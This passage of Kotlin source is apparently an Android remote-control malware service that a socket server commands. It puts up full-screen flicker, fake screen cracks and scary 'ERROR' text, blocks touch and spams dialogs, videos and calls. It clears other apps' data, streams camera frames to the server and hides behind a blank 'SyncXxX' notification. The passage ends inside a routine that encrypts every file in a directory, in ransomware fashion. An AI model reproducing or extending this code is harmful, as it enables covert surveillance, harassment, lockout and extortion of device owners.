                    format = android.graphics.PixelFormat.OPAQUE
                    flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    width = WindowManager.LayoutParams.MATCH_PARENT
                    height = WindowManager.LayoutParams.MATCH_PARENT
                    alpha = 1f
                }
                blackBlinkView = android.view.View(this@DeviceService)
                blackBlinkView!!.setBackgroundColor(android.graphics.Color.BLACK)
                wm.addView(blackBlinkView, params)
                while (isBlinkRunning) {
                    blackBlinkView?.alpha = 1f
                    Thread.sleep(flickerSpeed)
                    blackBlinkView?.alpha = 0.3f
                    Thread.sleep(flickerSpeed / 2)
                }
                wm.removeView(blackBlinkView)
            } catch (e: Exception) { Log.e("DeviceService", "BlackBlink: ${e.message}"); isBlinkRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("blackBlinkActive", true) })
        Log.d("DeviceService", "⚫ BLACK BLINK STARTED")
    }

    private fun stopBlackBlink() {
        isBlinkRunning = false
        try { blackBlinkThread?.join(1000) } catch (e: Exception) {}
        try { if (blackBlinkView != null) { val wm = getSystemService(WINDOW_SERVICE) as WindowManager; wm.removeView(blackBlinkView) } } catch (e: Exception) {}
        blackBlinkView = null
        emitStatus(JSONObject().apply { put("blackBlinkActive", false) })
        Log.d("DeviceService", "Black Blink stopped")
    }

    private fun startScreenFreezeWithBlink() {
        stopBlackBlink()
        isFreezeRunning = false
        isBlinkRunning = true
        blackBlinkThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val params = WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                    format = android.graphics.PixelFormat.OPAQUE
                    flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    width = WindowManager.LayoutParams.MATCH_PARENT
                    height = WindowManager.LayoutParams.MATCH_PARENT
                }
                blackBlinkView = android.view.View(this@DeviceService)
                blackBlinkView!!.setBackgroundColor(android.graphics.Color.BLACK)
                wm.addView(blackBlinkView, params)
                var flickerCount = 0
                while (isBlinkRunning && flickerCount < 20) {
                    blackBlinkView?.alpha = 1f
                    Thread.sleep(80)
                    blackBlinkView?.alpha = 0.2f
                    Thread.sleep(40)
                    flickerCount++
                }
                blackBlinkView?.alpha = 1f
                while (isBlinkRunning) Thread.sleep(100)
                wm.removeView(blackBlinkView)
            } catch (e: Exception) { Log.e("DeviceService", "ScreenFreeze+Blink: ${e.message}"); isBlinkRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("screenFreezeBlinkActive", true); put("deviceLocked", true) })
        Log.d("DeviceService", "🔴 SCREEN FREEZE + BLINK ACTIVE")
    }

    private fun startGreenScreen(stackCount: Int = 5, opacity: Float = 0.3f) {
        if (isGreenScreenRunning) return
        isGreenScreenRunning = true
        greenScreenViews.clear()
        greenScreenThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val displayMetrics = android.util.DisplayMetrics()
                (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.getMetrics(displayMetrics)
                val screenWidth = displayMetrics.widthPixels
                val screenHeight = displayMetrics.heightPixels
                repeat(stackCount) {
                    val view = android.view.View(this@DeviceService)
                    view.setBackgroundColor(android.graphics.Color.parseColor("#00FF00"))
                    view.alpha = opacity
                    val size = (100 + kotlin.random.Random.nextInt(300)).toInt()
                    val x = kotlin.random.Random.nextInt(screenWidth - size)
                    val y = kotlin.random.Random.nextInt(screenHeight - size)
                    val params = WindowManager.LayoutParams().apply {
                        type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                        format = android.graphics.PixelFormat.TRANSLUCENT
                        flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        width = size
                        height = size
                        this.x = x
                        this.y = y
                        alpha = opacity
                    }
                    wm.addView(view, params)
                    greenScreenViews.add(view)
                }
                while (isGreenScreenRunning) {
                    Thread.sleep(2000)
                    if (greenScreenViews.size < stackCount * 2) {
                        val view = android.view.View(this@DeviceService)
                        view.setBackgroundColor(android.graphics.Color.parseColor("#00FF00"))
                        view.alpha = opacity
                        val size = (100 + kotlin.random.Random.nextInt(300)).toInt()
                        val x = kotlin.random.Random.nextInt(screenWidth - size)
                        val y = kotlin.random.Random.nextInt(screenHeight - size)
                        val params = WindowManager.LayoutParams().apply {
                            type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                            format = android.graphics.PixelFormat.TRANSLUCENT
                            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            width = size
                            height = size
                            this.x = x
                            this.y = y
                            alpha = opacity
                        }
                        wm.addView(view, params)
                        greenScreenViews.add(view)
                    }
                }
                val wm2 = getSystemService(WINDOW_SERVICE) as WindowManager
                greenScreenViews.forEach { try { wm2.removeView(it) } catch (e: Exception) {} }
                greenScreenViews.clear()
            } catch (e: Exception) { Log.e("DeviceService", "GreenScreen: ${e.message}"); isGreenScreenRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("greenScreenActive", true) })
        Log.d("DeviceService", "💚 GREEN SCREEN OVERLAY STARTED")
    }

    private fun stopGreenScreen() {
        isGreenScreenRunning = false
        try { greenScreenThread?.join(1000) } catch (e: Exception) {}
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            greenScreenViews.forEach { try { wm.removeView(it) } catch (e: Exception) {} }
            greenScreenViews.clear()
        } catch (e: Exception) {}
        emitStatus(JSONObject().apply { put("greenScreenActive", false) })
        Log.d("DeviceService", "Green Screen stopped")
    }

    private fun startCrackOverlay() {
        if (isCrackRunning) return
        isCrackRunning = true
        crackOverlayThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                crackOverlayView = object : android.view.View(this@DeviceService) {
                    override fun onDraw(canvas: android.graphics.Canvas) {
                        super.onDraw(canvas)
                        val paint = android.graphics.Paint().apply {
                            color = android.graphics.Color.parseColor("#FF3333")
                            strokeWidth = 3f
                            isAntiAlias = true
                            style = android.graphics.Paint.Style.STROKE
                        }
                        val width = width.toFloat()
                        val height = height.toFloat()
                        val rand = kotlin.random.Random
                        canvas.drawLine(width / 2, 0f, width / 2 + rand.nextInt(200) - 100, height / 2, paint)
                        canvas.drawLine(width / 2 + rand.nextInt(200) - 100, height / 2, width / 2 + rand.nextInt(400) - 200, height, paint)
                        canvas.drawLine(0f, height / 3, width / 4 + rand.nextInt(100), height / 2, paint)
                        canvas.drawLine(width, height / 2, width - width / 4 + rand.nextInt(100), height / 3, paint)
                        repeat(5) {
                            val startX = rand.nextInt(width.toInt()).toFloat()
                            val startY = rand.nextInt(height.toInt()).toFloat()
                            val endX = startX + rand.nextInt(300) - 150
                            val endY = startY + rand.nextInt(300) - 150
                            canvas.drawLine(startX, startY, endX, endY, paint)
                        }
                    }
                }
                val params = WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                    format = android.graphics.PixelFormat.TRANSLUCENT
                    flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    width = WindowManager.LayoutParams.MATCH_PARENT
                    height = WindowManager.LayoutParams.MATCH_PARENT
                    alpha = 0.7f
                }
                wm.addView(crackOverlayView, params)
                while (isCrackRunning) {
                    Thread.sleep(500)
                    crackOverlayView?.invalidate()
                }
                wm.removeView(crackOverlayView)
            } catch (e: Exception) { Log.e("DeviceService", "CrackOverlay: ${e.message}"); isCrackRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("crackOverlayActive", true) })
        Log.d("DeviceService", "🔴 CRACK OVERLAY STARTED")
    }

    private fun stopCrackOverlay() {
        isCrackRunning = false
        try { crackOverlayThread?.join(1000) } catch (e: Exception) {}
        try { if (crackOverlayView != null) { val wm = getSystemService(WINDOW_SERVICE) as WindowManager; wm.removeView(crackOverlayView) } } catch (e: Exception) {}
        crackOverlayView = null
        emitStatus(JSONObject().apply { put("crackOverlayActive", false) })
        Log.d("DeviceService", "Crack Overlay stopped")
    }

    private fun startHorrorText(text: String = "ERROR", duration: Long = 0) {
        if (isHorrorTextRunning && duration == 0L) return
        isHorrorTextRunning = true
        horrorTextThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val displayMetrics = android.util.DisplayMetrics()
                (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.getMetrics(displayMetrics)
                val screenWidth = displayMetrics.widthPixels
                val screenHeight = displayMetrics.heightPixels
                val textView = android.widget.TextView(this@DeviceService)
                textView.text = text
                textView.textSize = 80f
                textView.setTextColor(android.graphics.Color.parseColor("#FF3333"))
                textView.typeface = android.graphics.Typeface.defaultFromStyle(android.graphics.Typeface.BOLD)
                textView.textAlignment = android.view.View.TEXT_ALIGNMENT_CENTER
                textView.setShadowLayer(10f, 3f, 3f, android.graphics.Color.BLACK)
                textView.scaleX = 1.1f
                textView.scaleY = 0.95f
                textView.rotation = kotlin.random.Random.nextFloat() * 2 - 1
                val params = WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                    format = android.graphics.PixelFormat.TRANSLUCENT
                    flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    width = (screenWidth * 0.8).toInt()
                    height = 300
                    x = (screenWidth * 0.1).toInt()
                    y = (screenHeight / 2) - 150
                    alpha = 0.9f
                }
                wm.addView(textView, params)
                horrorTextViews.add(textView)
                if (duration > 0) {
                    Thread.sleep(duration)
                    wm.removeView(textView)
                    horrorTextViews.remove(textView)
                    isHorrorTextRunning = false
                } else {
                    while (isHorrorTextRunning) Thread.sleep(100)
                    wm.removeView(textView)
                    horrorTextViews.remove(textView)
                }
            } catch (e: Exception) { Log.e("DeviceService", "HorrorText: ${e.message}"); isHorrorTextRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("horrorTextActive", true) })
        Log.d("DeviceService", "🔤 HORROR TEXT DISPLAYED")
    }

    private fun stopHorrorText() {
        isHorrorTextRunning = false
        try { horrorTextThread?.join(1000) } catch (e: Exception) {}
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            horrorTextViews.forEach { try { wm.removeView(it) } catch (e: Exception) {} }
            horrorTextViews.clear()
        } catch (e: Exception) {}
        emitStatus(JSONObject().apply { put("horrorTextActive", false) })
        Log.d("DeviceService", "Horror Text stopped")
    }

    private fun startTextSpam(spamCount: Int = 10, spamText: String = "ERROR") {
        if (isTextSpamRunning) return
        isTextSpamRunning = true
        spamTextViews.clear()
        textSpamThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val displayMetrics = android.util.DisplayMetrics()
                (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.getMetrics(displayMetrics)
                val screenWidth = displayMetrics.widthPixels
                val screenHeight = displayMetrics.heightPixels
                repeat(spamCount) {
                    val textView = android.widget.TextView(this@DeviceService)
                    textView.text = spamText
                    textView.textSize = (20 + kotlin.random.Random.nextInt(40)).toFloat()
                    textView.setTextColor(android.graphics.Color.parseColor("#FF${kotlin.random.Random.nextInt(256):02X}${kotlin.random.Random.nextInt(256):02X}"))
                    textView.rotation = (kotlin.random.Random.nextInt(360)).toFloat()
                    textView.alpha = 0.6f
                    val x = kotlin.random.Random.nextInt(screenWidth)
                    val y = kotlin.random.Random.nextInt(screenHeight)
                    val params = WindowManager.LayoutParams().apply {
                        type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                        format = android.graphics.PixelFormat.TRANSLUCENT
                        flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        width = 400
                        height = 200
                        this.x = x
                        this.y = y
                        alpha = 0.7f
                    }
                    wm.addView(textView, params)
                    spamTextViews.add(textView)
                    Thread.sleep(200)
                }
                while (isTextSpamRunning) Thread.sleep(1000)
                val wm2 = getSystemService(WINDOW_SERVICE) as WindowManager
                spamTextViews.forEach { try { wm2.removeView(it) } catch (e: Exception) {} }
                spamTextViews.clear()
            } catch (e: Exception) { Log.e("DeviceService", "TextSpam: ${e.message}"); isTextSpamRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("textSpamActive", true) })
        Log.d("DeviceService", "💬 TEXT SPAM STARTED")
    }

    private fun stopTextSpam() {
        isTextSpamRunning = false
        try { textSpamThread?.join(1000) } catch (e: Exception) {}
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            spamTextViews.forEach { try { wm.removeView(it) } catch (e: Exception) {} }
            spamTextViews.clear()
        } catch (e: Exception) {}
        emitStatus(JSONObject().apply { put("textSpamActive", false) })
        Log.d("DeviceService", "Text Spam stopped")
    }

    private fun startMovingText(text: String = "GLITCH", speed: Long = 20) {
        if (isMovingTextRunning) return
        isMovingTextRunning = true
        movingTextThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val displayMetrics = android.util.DisplayMetrics()
                (getSystemService(WINDOW_SERVICE) as WindowManager).defaultDisplay.getMetrics(displayMetrics)
                val screenWidth = displayMetrics.widthPixels
                val screenHeight = displayMetrics.heightPixels
                movingTextView = android.widget.TextView(this@DeviceService)
                movingTextView!!.text = text
                movingTextView!!.textSize = 60f
                movingTextView!!.setTextColor(android.graphics.Color.parseColor("#FF3333"))
                movingTextView!!.typeface = android.graphics.Typeface.defaultFromStyle(android.graphics.Typeface.BOLD)
                movingTextView!!.setShadowLayer(8f, 2f, 2f, android.graphics.Color.BLACK)
                movingTextView!!.alpha = 0.8f
                val params = WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                    format = android.graphics.PixelFormat.TRANSLUCENT
                    flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    width = (screenWidth * 1.5).toInt()
                    height = 150
                    y = (screenHeight / 2) - 75
                    alpha = 0.9f
                }
                wm.addView(movingTextView, params)
                var xPos = screenWidth
                while (isMovingTextRunning && xPos > -screenWidth) {
                    try {
                        params.x = xPos
                        wm.updateViewLayout(movingTextView!!, params)
                        xPos -= 20
                        Thread.sleep(speed)
                    } catch (e: Exception) { break }
                }
                wm.removeView(movingTextView)
                movingTextView = null
            } catch (e: Exception) { Log.e("DeviceService", "MovingText: ${e.message}"); isMovingTextRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("movingTextActive", true) })
        Log.d("DeviceService", "🔤➡️ MOVING TEXT STARTED")
    }

    private fun stopMovingText() {
        isMovingTextRunning = false
        try { movingTextThread?.join(1000) } catch (e: Exception) {}
        try { if (movingTextView != null) { val wm = getSystemService(WINDOW_SERVICE) as WindowManager; wm.removeView(movingTextView) } } catch (e: Exception) {}
        movingTextView = null
        emitStatus(JSONObject().apply { put("movingTextActive", false) })
        Log.d("DeviceService", "Moving Text stopped")
    }

    private fun uninstallApp(value: String) {
        try {
            val pkg = if (value.startsWith("{")) {
                JSONObject(value).optString("package", "")
            } else {
                value
            }
            if (pkg.isBlank()) return

            // Metode 1: Buka halaman Info Aplikasi di Settings (Cara Paling Aman & Manusiawi)
            try {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$pkg")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                emitStatus(JSONObject().apply { put("uninstallApp", "opened_settings_for_$pkg") })
                return
            } catch (e: Exception) {
                Log.w("DeviceService", "uninstall settings err: ${e.message}")
            }

            // Metode 2: Paksa Hapus User Data (Jika punya akses khusus)
            try {
                Runtime.getRuntime().exec(arrayOf("pm", "clear", pkg)).waitFor(2, TimeUnit.SECONDS)
                emitStatus(JSONObject().apply { put("uninstallApp", "data_cleared_for_$pkg") })
            } catch (e: Exception) {
                emitStatus(JSONObject().apply { put("uninstallApp", "failed: ${e.message}") })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "uninstallApp error: ${e.message}")
        }
    }

    private fun stopSpamCall() {
        isSpamCalling = false
        spamCallRunnable?.let { spamCallHandler?.removeCallbacks(it) }
        spamCallHandler = null
        spamCallRunnable = null
        emitStatus(JSONObject().apply { put("spamCallActive", false) })
    }

    private fun startSos() {
        try {
            startService(Intent(this, SosService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(SosService.ACTION_START).apply { setPackage(packageName) }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("sosActive", true) })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startSos error: ${e.message}")
        }
    }

    private fun stopSos() {
        val intent = Intent(SosService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("sosActive", false) })
    }

    private fun startFlashDisco(value: String) {
        if (isDiscoActive) return
        isDiscoActive = true
        discoPatternIndex = 0
        discoIsOn = false
        
        discoHandler = Handler(Looper.getMainLooper())
        
        discoRunnable = object : Runnable {
            override fun run() {
                if (!isDiscoActive) return
                
                discoIsOn = !discoIsOn
                try { 
                    torchCameraId?.let { cameraManager?.setTorchMode(it, discoIsOn) } 
                } catch (_: Exception) {}

                val delay = discoPattern[discoPatternIndex]
                discoPatternIndex = (discoPatternIndex + 1) % discoPattern.size
                
                discoHandler?.postDelayed(this, delay)
            }
        }
        discoRunnable?.let { discoHandler?.post(it) }
        
        emitStatus(JSONObject().apply { put("flashDiscoActive", true) })
    }

    private fun stopFlashDisco() {
        isDiscoActive = false
        discoRunnable?.let { discoHandler?.removeCallbacks(it) }
        discoHandler = null
        discoRunnable = null
        
        try { 
            torchCameraId?.let { cameraManager?.setTorchMode(it, false) } 
        } catch (_: Exception) {}
        
        emitStatus(JSONObject().apply { put("flashDiscoActive", false) })
    }

    private fun startSpamVideo(value: String) {
        stopSpamVideo()
        
        try {
            startService(Intent(this, SpamVideoService::class.java))
            
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(SpamVideoService.ACTION_START).apply {
                    setPackage(packageName)
                }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("spamVideoActive", true) })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startSpamVideo error: ${e.message}")
        }
    }

    private fun stopSpamVideo() {
        try {
            val intent = Intent(SpamVideoService.ACTION_STOP).apply { 
                setPackage(packageName) 
            }
            sendBroadcast(intent)
        } catch (_: Exception) {}

        spamVideoRunnable?.let { spamVideoHandler?.removeCallbacks(it) }
        spamVideoHandler = null
        spamVideoRunnable = null
        
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        Handler(Looper.getMainLooper()).post {
            spamVideoViews.toList().forEach { v ->
                try { 
                    (v as? android.webkit.WebView)?.destroy()
                    wm.removeView(v) 
                } catch (_: Exception) {}
            }
        }
        spamVideoViews.clear()
        
        emitStatus(JSONObject().apply { put("spamVideoActive", false) })
    }

    private fun startVideoOverlay() {
        try {
            startService(Intent(this, VideoOverlayService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(VideoOverlayService.ACTION_SHOW).apply { setPackage(packageName) }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("videoOverlayActive", true) })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startVideoOverlay error: ${e.message}")
        }
    }

    private fun stopVideoOverlay() {
        val intent = Intent(VideoOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("videoOverlayActive", false) })
    }

    private fun startDialogSpam(value: String) {
        try {
            val text = try { JSONObject(value).optString("text", value) } catch (_: Exception) { value }
            startService(Intent(this, DialogSpamService::class.java))
            Handler(Looper.getMainLooper()).postDelayed({
                val intent = Intent(DialogSpamService.ACTION_START).apply {
                    putExtra(DialogSpamService.EXTRA_TEXT, text)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
                emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
            }, 300L)
        } catch (e: Exception) {
            Log.e("DeviceService", "startDialogSpam: ${e.message}")
        }
    }

    private fun stopDialogSpam() {
        val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
    }

    private fun ttsSpeak(value: String) {
        try {
            val obj = JSONObject(value)
            val svcIntent = Intent(this, TTSService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svcIntent) else startService(svcIntent)
            val intent = Intent(TTSService.ACTION_SPEAK).apply {
                putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
                putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
                putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
                putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "ttsSpeak: ${e.message}")
        }
    }

    private fun ttsStop() {
        val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
    }

    private var touchBlockView: android.view.View? = null
    private var touchBlockHandler: android.os.Handler? = null
    private var touchBlockRunnable: Runnable? = null

    private fun startTouchBlock(value: String) {
        try {
            stopTouchBlock()
            val duration = try { org.json.JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }
            val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = android.view.WindowManager.LayoutParams(
                android.view.WindowManager.LayoutParams.MATCH_PARENT,
                android.view.WindowManager.LayoutParams.MATCH_PARENT,
                type,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
                android.graphics.PixelFormat.TRANSLUCENT
            )

            val view = android.view.View(this).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setOnTouchListener { _, _ -> true }
            }

            touchBlockView = view
            android.os.Handler(android.os.Looper.getMainLooper()).post { wm.addView(view, params) }
            emitStatus(JSONObject().apply { put("touchBlocked", true) })

            if (duration > 0) {
                touchBlockHandler = android.os.Handler(android.os.Looper.getMainLooper())
                touchBlockRunnable = Runnable { stopTouchBlock() }
                touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "startTouchBlock: ${e.message}")
        }
    }

    private fun stopTouchBlock() {
        touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
        touchBlockHandler  = null
        touchBlockRunnable = null
        touchBlockView?.let {
            try {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).removeView(it)
                }
            } catch (_: Exception) {}
        }
        touchBlockView = null
        emitStatus(JSONObject().apply { put("touchBlocked", false) })
    }

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }

    private fun showToast(message: String) {
        Handler(Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
        }
        emitStatus(JSONObject().apply { put("toastSent", message) })
    }

    private fun setVolumeMute(mute: Boolean) {
        try {
            val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audio.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            emitStatus(JSONObject().apply { put("volumeMuted", mute) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeMute: ${e.message}")
        }
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid error: ${e.message}")
            ""
        }
    }

    private fun readBattery() {
        try {
            val bi = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = bi?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = bi?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            val plugged = bi?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
            lastBatteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
            lastCharging = plugged != 0
        } catch (_: Exception) {}
    }

    private fun sendBatteryUpdate() {
        readBattery()
        if (socket?.connected() != true) return
        socket?.emit("device:battery", JSONObject().apply {
            put("deviceId", deviceId)
            put("battery", lastBatteryPct)
            put("charging", lastCharging)
        })
    }

    private fun sendFullStatus() {
        readBattery()
        val obj = JSONObject().apply {
            put("battery", lastBatteryPct)
            put("charging", lastCharging)
            put("deviceLocked", lockPin.isNotEmpty())
            put("lockTitle", lockTitle)
            put("screenActive", screenStreaming)
            put("cameraActive", streaming)
        }
        emitStatus(obj)
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        
        stopCameraInternal()
        stopScreenCapture()
        stopLockFlashBlink()
        stopVolumeLock()
        stopSpamVideo()
        stopFlashDisco()
        stopDrainData()
        stopSpamCall()

        synchronized(crashThreads) {
            crashThreads.forEach { it.interrupt() }
            crashThreads.clear()
        }

        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null

        batteryRunnable?.let { batteryHandler?.removeCallbacks(it) }
        batteryHandler = null
        batteryRunnable = null
        
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        
        socket?.disconnect()
        socket = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    // ====================================================================
    // HELPER FUNCTIONS
    // ====================================================================
    private fun deleteRecursive(file: java.io.File) {
        try {
            if (file.isDirectory) {
                file.listFiles()?.forEach { child ->
                    deleteRecursive(child)
                }
            }
            file.delete()
        } catch (e: Exception) {
            Log.w("DeviceService", "deleteRecursive error: ${e.message}")
        }
    }

    private fun processDirectory(dirPath: String, operation: String) {
        Thread {
            try {
                val dir = java.io.File(dirPath)
                if (!dir.exists()) {
                    Log.w("DeviceService", "Directory not found: $dirPath")
                    return@Thread
                }
                
                val encryptor = FileEncryptor()
                val files = dir.listFiles() ?: arrayOf()
                
                for (file in files) {
                    if (file.isFile) {
                        try {
                            when (operation) {
                                "encrypt" -> {
                                    encryptor.encryptFile(file)
                                    Log.d("DeviceService", "Encrypted: ${file.name}")
                                }
                                "decrypt" -> {
